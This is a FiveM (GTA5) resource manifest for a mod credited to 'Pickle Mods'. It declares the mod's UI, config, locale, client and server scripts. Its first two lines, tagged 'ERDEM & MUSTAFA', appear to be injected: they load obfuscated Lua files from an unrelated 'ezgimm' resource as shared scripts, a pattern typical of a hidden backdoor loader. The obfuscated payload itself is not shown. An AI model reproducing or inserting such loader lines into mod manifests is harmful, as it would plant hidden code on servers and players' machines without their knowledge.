shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA
 
 
fx_version "cerulean"
game "gta5"
author "Pickle Mods"
version "v1.1.6"
ui_page "nui/index.html"
files {
	"nui/index.html",
	"nui/assets/**/*.*",
}
shared_scripts {
	"@ox_lib/init.lua",
	"config.lua",
	"locales/locale.lua",
    "locales/translations/*.lua",
    "core/shared.lua"
}
client_scripts {
	"bridge/**/**/client.lua",
	"modules/**/client.lua",
    "core/client.lua"
}
server_scripts {
	"@mysql-async/lib/MySQL.lua",
	"bridge/**/**/server.lua",
	"modules/**/server.lua",
}
lua54 'yes'